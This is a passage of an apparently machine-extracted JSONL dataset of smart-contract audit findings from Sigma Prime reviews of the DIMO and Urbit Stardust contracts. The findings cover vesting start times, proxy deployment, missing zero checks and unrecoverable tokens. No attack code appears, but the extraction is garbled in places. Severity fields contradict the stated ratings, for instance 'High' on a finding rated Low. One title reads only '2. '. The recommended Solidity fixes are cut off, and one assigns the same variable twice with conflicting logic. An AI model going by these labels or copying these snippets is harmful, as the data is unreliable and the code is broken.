null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "DIMOVesting.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Finding ID": "DMO-14", "Target": "DIMOVesting.sol", "Status": "Resolved: See Resolution", "Asset": "DIMOVesting.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-015", "doc_id": "sigmaprime_dimo_review", "finding_index": 15, "page_start": 20, "title": "Lack of Validation on Vesting Start Time", "short_summary": null, "description_md": "#### **Description**\n\nThe DIMOVesting contract handles vesting of tokens in order to guarantee release after a certain period of time has elapsed. Vesting relies on a function \\_computeReleasableAmount() to calculate the amount to release. This function will only compute after a set start time has elapsed.\n\nIf owner() sets the start time to 0 (or any equivalent early epoch), vesting beneficiaries can instantly redeem the full amount.\n", "full_markdown": "| DMO-15 | Lack of Validation on Vesting Start Time |\n|--------|------------------------------------------|\n| Asset  | DIMOVesting.sol                          |\n| Status | Closed: See Resolution                   |\n| Rating | Informational                            |\n\n#### **Description**\n\nThe DIMOVesting contract handles vesting of tokens in order to guarantee release after a certain period of time has elapsed. Vesting relies on a function \\_computeReleasableAmount() to calculate the amount to release. This function will only compute after a set start time has elapsed.\n\nIf owner() sets the start time to 0 (or any equivalent early epoch), vesting beneficiaries can instantly redeem the full amount.\n\n#### **Recommendations**\n\nEnsure this behaviour is understood and consider adding checks for the \\_start variable to be within valid bounds (for example restricting start time to at least the current epoch).\n\n# **Resolution**\n\nThe development team indicated that \"the behavior is understood and intended\" as shown in [PR#1.](https://github.com/DIMO-Network/DIMO-vesting/pull/1)\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "DMO-15", "target": {"path": "DIMOVesting.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "DIMOVesting.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Finding ID": "DMO-15", "Target": "DIMOVesting.sol", "Status": "Closed: See Resolution", "Asset": "DIMOVesting.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-016", "doc_id": "sigmaprime_dimo_review", "finding_index": 16, "page_start": 21, "title": "Token Deployment Script Conflicts with UUPS Recommendations", "short_summary": null, "description_md": "## **Description**\n\nDimoToken inherits the UUPS upgradeable logic, implying the use of this type of proxy is desired. The development team has confirmed this intention. However, deployment scripts and mainnet deployed V2 token appear to ignore UUPS design decisions and leverage the use of ERC1967 proxy.\n\nThe error can be seen in the the code block below:\n\n```\n const Dimo = await ethers.getContractFactory(\"Dimo\");\n     console.log(\"Deploying proxy and implementation.\");\n const dimo = await upgrades.deployProxy(Dimo);\n     await dimo.deployed();\n```\n\nline [**17**] shows the use of OpenZeppelin Hardhat upgrades plugin. This plugin requires the explicit declaration of the proxy type as follows: upgrades.deployProxy(Dimo, {kind: 'UUPS'}) . In the implementation, the kind of proxy is missing. OZ documentation states that use of function deployProxy() that is missing a value for proxy type will deploy as Transparent proxy.\n\nIn practice, the default behaviour of the proxy types were being altered at the time of deployment, which explains the behaviour of the contract deployments on mainnet. On mainnet, TokenV1 was deployed as an ERC1967 proxy. During the upgrade to V2, logic was included to ensure UUPS implementations were inherited and valid \\_authorizeUpgrade overrides prevented arbitrary users from upgrading the token. The mainnet TokenV2 contains logic to ensure only UPGRADER\\_ROLE is able to upgrade, which effectively mitigates the issue in the deployment script logic.\n\nIt is worth mentioning that the current UPGRADER\\_ROLE is held by the GNOSIS SAFE Proxy contract with address 84ae2025b9620fd926d4e60673fcea2385c79d8a .\n", "full_markdown": "| DMO-16 | Token Deployment Script Conflicts with UUPS Recommendations |\n|--------|-------------------------------------------------------------|\n| Asset  | scripts/deploy.js                                           |\n| Status | Closed: See Resolution                                      |\n| Rating | Informational                                               |\n\n## **Description**\n\nDimoToken inherits the UUPS upgradeable logic, implying the use of this type of proxy is desired. The development team has confirmed this intention. However, deployment scripts and mainnet deployed V2 token appear to ignore UUPS design decisions and leverage the use of ERC1967 proxy.\n\nThe error can be seen in the the code block below:\n\n```\n const Dimo = await ethers.getContractFactory(\"Dimo\");\n     console.log(\"Deploying proxy and implementation.\");\n const dimo = await upgrades.deployProxy(Dimo);\n     await dimo.deployed();\n```\n\nline [**17**] shows the use of OpenZeppelin Hardhat upgrades plugin. This plugin requires the explicit declaration of the proxy type as follows: upgrades.deployProxy(Dimo, {kind: 'UUPS'}) . In the implementation, the kind of proxy is missing. OZ documentation states that use of function deployProxy() that is missing a value for proxy type will deploy as Transparent proxy.\n\nIn practice, the default behaviour of the proxy types were being altered at the time of deployment, which explains the behaviour of the contract deployments on mainnet. On mainnet, TokenV1 was deployed as an ERC1967 proxy. During the upgrade to V2, logic was included to ensure UUPS implementations were inherited and valid \\_authorizeUpgrade overrides prevented arbitrary users from upgrading the token. The mainnet TokenV2 contains logic to ensure only UPGRADER\\_ROLE is able to upgrade, which effectively mitigates the issue in the deployment script logic.\n\nIt is worth mentioning that the current UPGRADER\\_ROLE is held by the GNOSIS SAFE Proxy contract with address 84ae2025b9620fd926d4e60673fcea2385c79d8a .\n\n#### **Recommendations**\n\nMake sure this behaviour is understood and acknowledged.\n\n# **Resolution**\n\nThe development team indicated that \"the behavior is understood\" as seen in [PR#2.](https://github.com/DIMO-Network/dimo-token/pull/2)\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "DMO-16", "target": {"path": "scripts/deploy.js", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "bc5efdf39a514c003f86f1051d83fac516a170de", "branch": null, "relative_file": "scripts/deploy.js", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Finding ID": "DMO-16", "Target": "scripts/deploy.js", "Status": "Closed: See Resolution", "Asset": "scripts/deploy.js", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-017", "doc_id": "sigmaprime_dimo_review", "finding_index": 17, "page_start": 22, "title": "Miscellaneous General Comments", "short_summary": null, "description_md": "#### **Description**\n\nThis section details miscellaneous findings in the Dimo contracts.\n\n#### 1. **Minimise Function Access:**\n\nIt is best practice to use the minimum visibility for a function, for gas saving purposes:\n\n- DimoV2.pause() should be declared external.\n- DimoV2.unpause() should be declared external.\n- DimoV2.mint() should be declared external.\n\n#### 2. **Checks Effects Interactions:**\n\nIt is best practice to structure code in the order of making checks then updating variables and lastly interacting externally. This is to prevent reentrancy. Although there was no specific exploitable reentrancy occurrence detected (apart from [DMO-14\\)](#page-19-0), it is nonetheless recommended to reorder code to follow the *\"Checks-Effects-Interactions\"* pattern.\n\n- In Root,sol, \\_safeMint() should be moved from line [**112**] to line [**116**], below the state variable updates.\n- In Root,sol, \\_safeMint() should be moved from line [**84**] to line [**88**], below the state variable updates.\n\n#### 3. **Zero Value Checks:**\n\nThe zero value checks should be considered for the following parameters:\n\n- DimoChildToken.deposit.depositData\n- DimoChildToken.withdraw.amount\n- DimoChildToken.mint.amount\n- Dimo.mint.amount\n- DimoV2.mint.amount\n- Root.setController.\\_controller\n- Root.mintRootBatch.\\_owner\n- Root.mintRoot.\\_owner\n- Vehicle.mintVehicle.\\_owner ( Vehicle.mintVehicleSign.\\_owner is not necessary because of the signature)\n- Root.mintRootBatch.\\_owner\n\n#### 4. **Comment Issues:**\n\n• DIMORegistry line [**108**] and line [**144**] comments describe the add functionality, not remove.\n\n\n#### 5. **Incorrect Error Message/Unreachable Code:**\n\nDIMORegistry line [**161**] states that a selector is unregistered. By the logic of this contract, this check should always pass, as execution can only reach this point if the check on line [**153**] established that s.selectorsHash[implementation] is equal to a hash that contains the selector in question. Nevertheless, it could be modified by a module. In that case, the comment could be incorrect: a selector that is registered to a different implementation would also fail this check.\n\n#### 6. **Registry Function Signature Collisions:**\n\nDIMORegistry does not allow modules to be added if s.implementations[selectors[i]] != address(0) , therefore registered function selectors cannot be duplicated across modules. This provides some security benefits, however, function signatures can collide. For example withdraw(uint256) and OwnerTransferV7b711143(uint256) unexpectedly produce a single function signature of 2e1a7d4d . All modules should therefore be checked for any potential function signature collisions with other modules.\n\n#### 7. **Possible Specification Problem:**\n\nRoot.mintRootBatch() can be successfully called whether 'name' attribute is whitelisted in advance or not. Note this in relation to the comment on line [**66**] which says *It is assumed the 'name' attribute is whitelisted in advance*.\n\n#### 8. **Vehicle without Root:**\n\nVehicle.addRootAttribute() and Vehicle.mintRoot() are both callable if no vehicle nodeType is set in the VehicleStorage .\n\n#### 9. **Error Message Wording:**\n\nThe error string on line [**128**] of DIMOVesting.sol refers to \"vested\" tokens, when it means \"releasable\" tokens. It might be clearer to rephrase the entire message as, \"amount is too high\".\n\n#### 10. **Uninitialised Roles:**\n\nDimo Token V1 initially grants all roles to the admin address in its initializer. Dimo Token V2 does not have an initializer and so the role BURNER\\_ROLE is not initially granted to any address.\n\nThis role can however be granted directly through the function grantRole() .\n", "full_markdown": "| DMO-17 | Miscellaneous General Comments |\n|--------|--------------------------------|\n| Asset  | *.sol                          |\n| Status | Closed: See Resolution         |\n| Rating | Informational                  |\n\n#### **Description**\n\nThis section details miscellaneous findings in the Dimo contracts.\n\n#### 1. **Minimise Function Access:**\n\nIt is best practice to use the minimum visibility for a function, for gas saving purposes:\n\n- DimoV2.pause() should be declared external.\n- DimoV2.unpause() should be declared external.\n- DimoV2.mint() should be declared external.\n\n#### 2. **Checks Effects Interactions:**\n\nIt is best practice to structure code in the order of making checks then updating variables and lastly interacting externally. This is to prevent reentrancy. Although there was no specific exploitable reentrancy occurrence detected (apart from [DMO-14\\)](#page-19-0), it is nonetheless recommended to reorder code to follow the *\"Checks-Effects-Interactions\"* pattern.\n\n- In Root,sol, \\_safeMint() should be moved from line [**112**] to line [**116**], below the state variable updates.\n- In Root,sol, \\_safeMint() should be moved from line [**84**] to line [**88**], below the state variable updates.\n\n#### 3. **Zero Value Checks:**\n\nThe zero value checks should be considered for the following parameters:\n\n- DimoChildToken.deposit.depositData\n- DimoChildToken.withdraw.amount\n- DimoChildToken.mint.amount\n- Dimo.mint.amount\n- DimoV2.mint.amount\n- Root.setController.\\_controller\n- Root.mintRootBatch.\\_owner\n- Root.mintRoot.\\_owner\n- Vehicle.mintVehicle.\\_owner ( Vehicle.mintVehicleSign.\\_owner is not necessary because of the signature)\n- Root.mintRootBatch.\\_owner\n\n#### 4. **Comment Issues:**\n\n• DIMORegistry line [**108**] and line [**144**] comments describe the add functionality, not remove.\n\n\n#### 5. **Incorrect Error Message/Unreachable Code:**\n\nDIMORegistry line [**161**] states that a selector is unregistered. By the logic of this contract, this check should always pass, as execution can only reach this point if the check on line [**153**] established that s.selectorsHash[implementation] is equal to a hash that contains the selector in question. Nevertheless, it could be modified by a module. In that case, the comment could be incorrect: a selector that is registered to a different implementation would also fail this check.\n\n#### 6. **Registry Function Signature Collisions:**\n\nDIMORegistry does not allow modules to be added if s.implementations[selectors[i]] != address(0) , therefore registered function selectors cannot be duplicated across modules. This provides some security benefits, however, function signatures can collide. For example withdraw(uint256) and OwnerTransferV7b711143(uint256) unexpectedly produce a single function signature of 2e1a7d4d . All modules should therefore be checked for any potential function signature collisions with other modules.\n\n#### 7. **Possible Specification Problem:**\n\nRoot.mintRootBatch() can be successfully called whether 'name' attribute is whitelisted in advance or not. Note this in relation to the comment on line [**66**] which says *It is assumed the 'name' attribute is whitelisted in advance*.\n\n#### 8. **Vehicle without Root:**\n\nVehicle.addRootAttribute() and Vehicle.mintRoot() are both callable if no vehicle nodeType is set in the VehicleStorage .\n\n#### 9. **Error Message Wording:**\n\nThe error string on line [**128**] of DIMOVesting.sol refers to \"vested\" tokens, when it means \"releasable\" tokens. It might be clearer to rephrase the entire message as, \"amount is too high\".\n\n#### 10. **Uninitialised Roles:**\n\nDimo Token V1 initially grants all roles to the admin address in its initializer. Dimo Token V2 does not have an initializer and so the role BURNER\\_ROLE is not initially granted to any address.\n\nThis role can however be granted directly through the function grantRole() .\n\n# **Recommendations**\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.\n\n#### **Resolution**\n\nhe issues were addressed in three separate pull requests across three repositories. Those include [DIMO token PR#2,](https://github.com/DIMO-Network/dimo-token/pull/2) .\n\n#### 1. **Minimise Function Access:**\n\n1a) Fixed in [commit #9b97f8ed](https://github.com/DIMO-Network/dimo-token/commit/9b97f8ed39cff21bb3e3c5f896d595dfea592f9d)\n\n#### 2. **Checks Effects Interactions:**\n\n2a) Fixed in commit #https://github.com/DIMO-Network/dimo-identity/commit/ade7190314582a87df0083dfb139bef2652b104c.\n\n#### 3. **Zero Value Checks:**\n\nThe zero value checks should be considered for the following parameters:\n\n• DimoChildToken.deposit.depositData\n\n\n\n- DimoChildToken.withdraw.amount\n- DimoChildToken.mint.amount\n- Dimo.mint.amount\n- DimoV2.mint.amount\n- Root.setController.\\_controller : Fixed in [commit #bd4b17ab](https://github.com/DIMO-Network/dimo-identity/commit/bd4b17ab2a9da9e890ead5227413e16f50e3b18d)\n- Root.mintRootBatch.\\_owner : Not fixed, accepted as unnecessary due to checks elswhere\n- Root.mintRoot.\\_owner : Not fixed, accepted as unnecessary due to checks elswhere\n- Vehicle.mintVehicle.\\_owner : Not fixed, accepted as unnecessary due to checks elswhere\n- Root.mintRootBatch.\\_owner : Not fixed, accepted as unnecessary due to checks elswhere\n\n#### 4. **Comment Issues:**\n\n(a) Fixed in [commit #46e2dc51](https://github.com/DIMO-Network/dimo-identity/commit/46e2dc51cb9940f5c5d6497fe5c84a7af42b581b)\n\n#### 5. **Incorrect Error Message/Unreachable Code:**\n\n(a) Fixed in [commit #7456c0c3](https://github.com/DIMO-Network/dimo-identity/commit/7456c0c3ff7e8475a7c2b6b96595a6dd6e00953c)\n\n#### 6. **Registry Function Signature Collisions:**\n\n(a) Behaviour is understood and accepted\n\n#### 7. **Possible Specification Problem:**\n\n(a) Behaviour is understood and accepted\n\n## 8. **Vehicle without Root:**\n\n(a) Behaviour is understood and accepted. They will set the nodeType right after the module is added.\n\n#### 9. **Error Message Wording:**\n\n(a) Fixed in [commit #b835a7e3](https://github.com/DIMO-Network/DIMO-vesting/pull/1/commits/b835a7e39efb0552cea6b1473d26b988e0b82ab8)\n\n#### 10. **Uninitialised Roles:**\n\n10a) Behaviour is accepted and intended\n\n\nDimo Smart Contracts Test Suite\n", "severity": "Informational", "difficulty": "Low", "type": null, "finding_id": "DMO-17", "target": {"path": "Root.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "bc5efdf39a514c003f86f1051d83fac516a170de", "branch": null, "relative_file": "Root.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Finding ID": "DMO-17", "Target": "Root.sol", "Status": "Closed: See Resolution", "Asset": "*.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-001", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 1, "page_start": 6, "title": "Treasury Cannot Recover Star Mistakenly Transferred To It", "short_summary": null, "description_md": "#### **Description**\n\nA user can mistakenly transfer ownership of a star to the Treasury contract. Consider the following case:\n\n- 1. Alice spawns a star;\n- 2. Instead of setting Treasury as a proxy through Ecliptic.setSpawnProxy() , Alice calls a different function, Ecliptic.transferPoint() . The star ownership changes from Alice to Treasury ;\n- 3. Treasury was not notified of such transfer and therefore the star is not recorded in the assets ;\n- 4. Alice cannot take back the mistakenly transferred star.\n", "full_markdown": "| UTR-01 | Treasury Cannot Recover Star Mistakenly Transferred To It |             |                 |\n|--------|-----------------------------------------------------------|-------------|-----------------|\n| Asset  | Treasury.sol                                              |             |                 |\n| Status | Open                                                      |             |                 |\n| Rating | Severity: Low                                             | Impact: Low | Likelihood: Low |\n\n#### **Description**\n\nA user can mistakenly transfer ownership of a star to the Treasury contract. Consider the following case:\n\n- 1. Alice spawns a star;\n- 2. Instead of setting Treasury as a proxy through Ecliptic.setSpawnProxy() , Alice calls a different function, Ecliptic.transferPoint() . The star ownership changes from Alice to Treasury ;\n- 3. Treasury was not notified of such transfer and therefore the star is not recorded in the assets ;\n- 4. Alice cannot take back the mistakenly transferred star.\n\n#### **Recommendations**\n\nConsider adding a function to account for transferred stars into the assets array. For this purpose, a mapping can help check whether the star has been included in assets :\n\n```\nmapping ( uint16 => bool ) assetMap ;\n```\n\nThen, the following function can be used.\n\n```\nfunction addToAsset ( uint16 _star ) public {\n require ( assetMap [ _star ] == false , \" Treasury : The star is in the assets \");\n```\n\nNotice that additional instructions are necessary on the functions deposit() and redeem() . In the deposit() function, the following instruction can be added on line [**111**]:\n\n```\nassetMap [ _star ] = true ;\n```\n\nWhile in the redeem() function, the following instruction can be added on line [**130**]:\n\n```\ndelete assetMap [ _star ];\n```\n", "severity": "High", "difficulty": "Low", "type": null, "finding_id": "UTR-01", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ransonhobbes/stardust", "org": "ransonhobbes", "name": "stardust", "commit": "c446b1f12f53fa75ea6c347daee1e15df562a81d", "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Rating": "Severity: Low / Impact: Low / Likelihood: Low", "Finding ID": "UTR-01", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "Low", "Likelihood": "Low"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-002", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 2, "page_start": 7, "title": "2. ", "short_summary": null, "description_md": "#### **Description**\n\nA Treasury contract is coupled with a StarToken (ERC-777 standard) token. StarToken tokens are minted to a user who deposits a star to the Treasury contract and burned when a user redeems a star. The Treasury contract does not have a function to sweep over Startoken tokens mistakenly sent to it.\n\nConsider the following scenario:\n\n- 1. Alice deposits a star and receives 1*e*18 StarToken ;\n- 2. Alice mistakenly transfers some of her StarToken tokens, say 100 tokens, to Treasury contract;\n- 3. Alice cannot recover the mistakenly transferred tokens, while the Treasury contract also cannot recover the tokens.\n", "full_markdown": "| UTR-02 |               | Treasury Cannot Recover StarToken Tokens Mistakenly Transferred To It |                 |\n|--------|---------------|-----------------------------------------------------------------------|-----------------|\n| Asset  | Treasury.sol  |                                                                       |                 |\n| Status | Open          |                                                                       |                 |\n| Rating | Severity: Low | Impact: Low                                                           | Likelihood: Low |\n\n#### **Description**\n\nA Treasury contract is coupled with a StarToken (ERC-777 standard) token. StarToken tokens are minted to a user who deposits a star to the Treasury contract and burned when a user redeems a star. The Treasury contract does not have a function to sweep over Startoken tokens mistakenly sent to it.\n\nConsider the following scenario:\n\n- 1. Alice deposits a star and receives 1*e*18 StarToken ;\n- 2. Alice mistakenly transfers some of her StarToken tokens, say 100 tokens, to Treasury contract;\n- 3. Alice cannot recover the mistakenly transferred tokens, while the Treasury contract also cannot recover the tokens.\n\n#### **Recommendations**\n\nConsider introducing a function where a privileged account (e.g. a governance contract, say Governor), can recover any excess tokens:\n\n```\nfunction recoverTokens ( address _to ) onlyGovernor public {\n uint256 tokenAmount ;\n tokenAmount = startoken . balanceOf ( address ( this )) % ( assets . length * oneStar );\n tokenAmount = startoken . balanceOf ( address ( this ));\n  startoken . transferFrom ( address ( this ), _to , tokenAmount );\n```\n\n*Note that this would require the governor to have an allowance on behalf of the Treasury contract in the StarToken contrat*\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "UTR-02", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ransonhobbes/stardust", "org": "ransonhobbes", "name": "stardust", "commit": "c446b1f12f53fa75ea6c347daee1e15df562a81d", "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Rating": "Severity: Low / Impact: Low / Likelihood: Low", "Finding ID": "UTR-02", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "Low", "Likelihood": "Low"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-003", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 3, "page_start": 8, "title": "Multiple Treasury and StarToken Contracts Allowed", "short_summary": null, "description_md": "#### **Description**\n\nThe Treasury contract deploys a new StarToken contract during contract creation, as indicated on line [**26**]:\n\n```\nStarToken public startoken = new StarToken (0 , new address [](0));\n```\n\nIt is possible to deploy multiple Treasury contracts. It also means that there can be multiple StarToken contracts, where tokens in one StarToken contract cannot redeem a star in other Treasury contracts. This can potentially be confusing or misleading for users.\n", "full_markdown": "| UTR-03 | Multiple Treasury and StarToken Contracts Allowed |  |\n|--------|---------------------------------------------------|--|\n| Asset  | Treasury.sol                                      |  |\n| Status | Open                                              |  |\n| Rating | Informational                                     |  |\n\n#### **Description**\n\nThe Treasury contract deploys a new StarToken contract during contract creation, as indicated on line [**26**]:\n\n```\nStarToken public startoken = new StarToken (0 , new address [](0));\n```\n\nIt is possible to deploy multiple Treasury contracts. It also means that there can be multiple StarToken contracts, where tokens in one StarToken contract cannot redeem a star in other Treasury contracts. This can potentially be confusing or misleading for users.\n\n#### **Recommendations**\n\nMake sure this behaviour is intended and consider deploying a dedicated StarToken contract and hardcoding its address in the Treasury contract.\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "UTR-03", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ransonhobbes/stardust", "org": "ransonhobbes", "name": "stardust", "commit": "c446b1f12f53fa75ea6c347daee1e15df562a81d", "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Rating": "Informational", "Finding ID": "UTR-03", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "Low", "Likelihood": "Low"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-004", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 4, "page_start": 9, "title": "Potentially Unclaimable Star Upon Losing Tokens", "short_summary": null, "description_md": "### **Description**\n\nThe Treasury contract requires a fixed amount of 1*e*18 STAR tokens to redeem a star asset. Since STAR tokens are only minted when users deposit stars, the amount of tokens held by the Treasury must be 1*e*18 multiplied by Treasury 's asset count (equal to the number of deposited stars). That way, when all stars are redeemed, the total balance of STAR equals to zero.\n\nThis coupling between Treasury and STAR tokens means that if even one token is lost, i.e. sent to an address without a known related private key, then there should be at least one unclaimable star in the Treasury 's asset.\n", "full_markdown": "| UTR-04 | Potentially Unclaimable Star Upon Losing Tokens |  |\n|--------|-------------------------------------------------|--|\n| Asset  | Treasury.sol                                    |  |\n| Status | Open                                            |  |\n| Rating | Informational                                   |  |\n\n### **Description**\n\nThe Treasury contract requires a fixed amount of 1*e*18 STAR tokens to redeem a star asset. Since STAR tokens are only minted when users deposit stars, the amount of tokens held by the Treasury must be 1*e*18 multiplied by Treasury 's asset count (equal to the number of deposited stars). That way, when all stars are redeemed, the total balance of STAR equals to zero.\n\nThis coupling between Treasury and STAR tokens means that if even one token is lost, i.e. sent to an address without a known related private key, then there should be at least one unclaimable star in the Treasury 's asset.\n\n#### **Recommendations**\n\nMake sure this behaviour is intended.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": "UTR-04", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ransonhobbes/stardust", "org": "ransonhobbes", "name": "stardust", "commit": "c446b1f12f53fa75ea6c347daee1e15df562a81d", "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Rating": "Informational", "Finding ID": "UTR-04", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": null, "Likelihood": null}}
